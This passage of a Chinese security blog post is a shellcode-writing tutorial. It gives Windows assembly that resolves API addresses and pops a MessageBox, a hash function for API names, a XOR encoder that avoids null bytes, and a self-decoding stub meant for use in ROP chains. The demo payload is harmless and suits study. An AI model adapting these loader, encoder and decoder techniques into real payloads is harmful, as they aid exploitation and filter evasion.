class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第四步，payload</span></span><br><span class="line">fun_payload:</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0x20</span></span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        push edx</span><br><span class="line">        push ebx</span><br><span class="line">        push ecx</span><br><span class="line"></span><br><span class="line">        <span class="comment">//dll基址</span></span><br><span class="line">        call fun_GetModule</span><br><span class="line">        mov [ebp - <span class="number">0x4</span>], eax</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LoadLibraryA地址</span></span><br><span class="line">        push <span class="number">0xd</span>    </span><br><span class="line">        mov ecx, [ebp + <span class="number">0x8</span>]            <span class="comment">//获取字符串首地址</span></span><br><span class="line">        push ecx</span><br><span class="line">        push eax</span><br><span class="line">        call fun_GetProcAddr</span><br><span class="line">        mov [ebp - <span class="number">0x8</span>], eax            <span class="comment">//LoadLibraryA地址</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//GetProcAddress地址</span></span><br><span class="line">        push <span class="number">0xf</span>        </span><br><span class="line">        lea ecx, [ecx + <span class="number">0xd</span>]            <span class="comment">//获取字符串</span></span><br><span class="line">        push ecx</span><br><span class="line">        push [ebp - <span class="number">0x4</span>]</span><br><span class="line">        call fun_GetProcAddr</span><br><span class="line">        mov [ebp - <span class="number">0xc</span>], eax            <span class="comment">//GetProcAddress地址</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//用load加载user32.dll</span></span><br><span class="line">        mov ecx, [ebp + <span class="number">0x8</span>]            <span class="comment">//获取user32字符串</span></span><br><span class="line">        lea ecx, [ecx + <span class="number">0x1c</span>]</span><br><span class="line">        push ecx</span><br><span class="line">        call [ebp - <span class="number">0x8</span>]</span><br><span class="line">        mov [ebp - <span class="number">0x10</span>], eax           <span class="comment">//user32.dll基址</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//用getprocaddr获取messagebox地址</span></span><br><span class="line">        mov ecx, [ebp + <span class="number">0x8</span>]            <span class="comment">//获取messagebox字符串</span></span><br><span class="line">        lea ecx, [ecx + <span class="number">0x27</span>]</span><br><span class="line">        push ecx</span><br><span class="line">        push [ebp - <span class="number">0x10</span>]</span><br><span class="line">        call [ebp - <span class="number">0xc</span>]</span><br><span class="line">        mov [ebp - <span class="number">0x14</span>], eax           <span class="comment">//MessageBoxA地址</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用messagebox</span></span><br><span class="line">        mov ecx, [ebp + <span class="number">0x8</span>]             <span class="comment">//获取Second_BC</span></span><br><span class="line">        lea ecx, [ecx + <span class="number">0x33</span>]</span><br><span class="line">        <span class="keyword">xor</span> eax, eax</span><br><span class="line">        push eax</span><br><span class="line">        push ecx</span><br><span class="line">        push ecx</span><br><span class="line">        push eax</span><br><span class="line">        call [ebp - <span class="number">0x14</span>]</span><br><span class="line"></span><br><span class="line">        pop ecx</span><br><span class="line">        pop ebx</span><br><span class="line">        pop edx</span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn <span class="number">0x4</span>                        <span class="comment">//接收一个参数，输出字符串地址</span></span><br></pre></td></tr></table></figure>



<p>以上代码用裸函数外套即可使用：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _declspec(naked)<span class="built_in">shellCode</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用ida提取之后的机械码shellcode即可放到ROP链中使用，前提是有漏洞；</p>
<h2 id="字符串优化"><a href="#字符串优化" class="headerlink" title="字符串优化"></a>字符串优化</h2><p>由于在上一步写入字符串这里，会引进\x00以及大量的字符串导致内存浪费，此处有一个方法使其优化：编码；</p>
<p>构造一个函数，使得字符串通过之后输出其对应的4字节哈希值，写入时写入哈希值，此时满足不破坏比较时的一个逻辑：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">getHash</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD digest = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str)</span><br><span class="line">    &#123;</span><br><span class="line">        digest = (digest &lt;&lt; <span class="number">25</span> | digest &gt;&gt; <span class="number">7</span>);</span><br><span class="line">        digest = digest + *str;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> digest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _declspec(naked)<span class="built_in">asmGetHash</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0x4</span></span><br><span class="line">        push ecx</span><br><span class="line">        push edx</span><br><span class="line">        push ebx</span><br><span class="line">        push esi</span><br><span class="line"></span><br><span class="line">        mov dword ptr [ebp - <span class="number">0x4</span>], <span class="number">0</span>    <span class="comment">//digest = 0</span></span><br><span class="line">        lea esi, [ebp + <span class="number">0x8</span>]            <span class="comment">//str</span></span><br><span class="line">        <span class="keyword">xor</span> ecx, ecx                    <span class="comment">//i = 0</span></span><br><span class="line">    tag_hashLoop:</span><br><span class="line">        <span class="keyword">xor</span> eax, eax</span><br><span class="line">        mov al, [esi + ecx]             <span class="comment">//取第i个字符</span></span><br><span class="line">        test al, al</span><br><span class="line">        jz tag_end</span><br><span class="line">        mov ebx, [ebp - <span class="number">0x4</span>]</span><br><span class="line">        shl ebx, <span class="number">0x19</span>                   <span class="comment">//digest &lt;&lt; 25</span></span><br><span class="line">        mov edx, [ebp - <span class="number">0x4</span>]</span><br><span class="line">        shr edx, <span class="number">0x7</span>                    <span class="comment">//digest &gt;&gt; 7</span></span><br><span class="line">        <span class="keyword">or</span> ebx, edx                     <span class="comment">// |</span></span><br><span class="line">        add ebx, eax                    <span class="comment">// + </span></span><br><span class="line">        mov [ebp - <span class="number">0x4</span>], ebx            <span class="comment">//digest = ...</span></span><br><span class="line">        inc ecx                         <span class="comment">//i++</span></span><br><span class="line">        jmp tag_hashLoop</span><br><span class="line">    tag_end:</span><br><span class="line">        mov eax, [ebp - <span class="number">0x4</span>]</span><br><span class="line"></span><br><span class="line">        pop esi</span><br><span class="line">        pop ebx</span><br><span class="line">        pop edx</span><br><span class="line">        pop ecx</span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn <span class="number">0x4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="编码优化"><a href="#编码优化" class="headerlink" title="编码优化"></a>编码优化</h2><p>除了字符串，代码中也会出现大量\x00，由此对代码进行编码处理，且编码可逆，输入过程中不出现\x00，进入程序内部后自解密为真实代码执行；</p>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>思路是使用异或对每个字节编码，长度不变，编码后的内容不应该有\x00，则选择的异或key有讲究；</p>
<p>在 0x01 ~ 0xff 之间遍历出一个可以使用的key进行异或；</p>
<p>则编码代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">enShellcode</span><span class="params">(<span class="keyword">char</span> * shellcode, <span class="keyword">int</span> shelllen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL result = TRUE;</span><br><span class="line">	<span class="keyword">int</span> nkey = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>* encodebuff = <span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>[shelllen];</span><br><span class="line">	<span class="comment">//遍历合适的key</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> key = <span class="number">0x1</span>; key &lt; <span class="number">0xff</span>; key++)</span><br><span class="line">	&#123;</span><br><span class="line">		result = TRUE;</span><br><span class="line">		nkey = key;</span><br><span class="line">		<span class="comment">//循环编码</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shelllen; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			encodebuff[i] = shellcode[i] ^ key;</span><br><span class="line">			<span class="keyword">if</span> (encodebuff[i] == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				result = FALSE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (result == TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (result == FALSE)</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	<span class="comment">//格式化打印</span></span><br><span class="line">	FILE* fp;</span><br><span class="line">	<span class="built_in">fopen_s</span>(&amp;fp, <span class="string">&quot;encode.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(fp, <span class="string">&quot;nkey = 0x%02x\n&quot;</span>, nkey);</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">&quot;shell len = %d\n&quot;</span>, shelllen);</span><br><span class="line">	<span class="built_in">fprintf</span>(fp,<span class="string">&quot;\\\n\&quot;&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shelllen; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp, <span class="string">&quot;\\x%02x&quot;</span>, encodebuff[i]);</span><br><span class="line">		<span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fprintf</span>(fp, <span class="string">&quot;\&quot; \\\n\&quot;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fprintf</span>(fp, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line">	<span class="keyword">delete</span>[] encodebuff;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p>对于输入的shellcode需要一段代码对其进行解码，这里会涉及到偏移问题，如下图所示；</p>
<p><img src="https://s2.loli.net/2023/06/19/blNtF74yEOmQnxg.png" alt="offset"></p>
<p>对于获取执行代码的地址，有一个非常经典的代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	call next_ins</span><br><span class="line">next_ins:</span><br><span class="line">	pop eax</span><br></pre></td></tr></table></figure>

<p>将eip压入栈，再弹出给eax寄存器，此时返回的地址则是pop eax这一条指令所在位置；</p>
<p>但问题出现在call next_ins，其硬编码会变成 E8 00 00 00，不能有\x00，所以代码需要改变为如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">40000</span> call <span class="number">40003</span>h</span><br><span class="line"><span class="number">40004</span> retn</span><br><span class="line"><span class="number">40005</span> pop eax</span><br></pre></td></tr></table></figure>

<p>此时40003地址的一字节和40004的retn指令硬编码共同组成两字节的汇编指令：inc ebx，这对实现解码来说无影响，执行这条指令后便pop rax了，且避免了产生\x00，此时返回的地址则是 40004 retn 这个地方；</p>
<p>此时解码汇编如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">xor</span> eax, eax					<span class="comment">//清零eax</span></span><br><span class="line">		call tag_get_eip<span class="number">-1</span>				<span class="comment">//获取retn处地址</span></span><br><span class="line">	tag_get_eip:</span><br><span class="line">		retn</span><br><span class="line">		pop eax</span><br><span class="line"></span><br><span class="line">		lea esi, [eax + offset]			<span class="comment">//通过本段汇编码长度得到shellcode地址</span></span><br><span class="line">		<span class="keyword">xor</span> ecx, ecx</span><br><span class="line">		mov cx, count					<span class="comment">//循环次数，shellcode长度</span></span><br><span class="line"></span><br><span class="line">	tag_decode:</span><br><span class="line">		mov al, [esi + ecx]				<span class="comment">//循环解码，倒序</span></span><br><span class="line">		<span class="keyword">xor</span> al, key</span><br><span class="line">		mov [esi + ecx], al</span><br><span class="line">		loop tag_decode</span><br><span class="line">		<span class="keyword">xor</span> [esi + ecx], key			<span class="comment">//解码漏了的第一个字节</span></span><br><span class="line"></span><br><span class="line">		jmp esi                         <span class="comment">//转到shellcode地址</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Second_BC</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://secondbc.github.io/SecondBC/2023/06/19/Windows_Shellcode/">https://secondbc.github.io/SecondBC/2023/06/19/Windows_Shellcode/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://secondbc.github.io/SecondBC">Second_BC の BloG</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/SecondBC/2024/02/26/SQL%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"><i class="fas fa-angle-left">&nbsp;</i><span>SQL学习日记</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/SecondBC/2023/04/14/NKCTF-2023-Bin%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"><span>NKCTF 2023 Bin部分复现</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2022 ～ 2024 By Second_BC</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/copy.js"></script><!--script(src=url)--></body></html>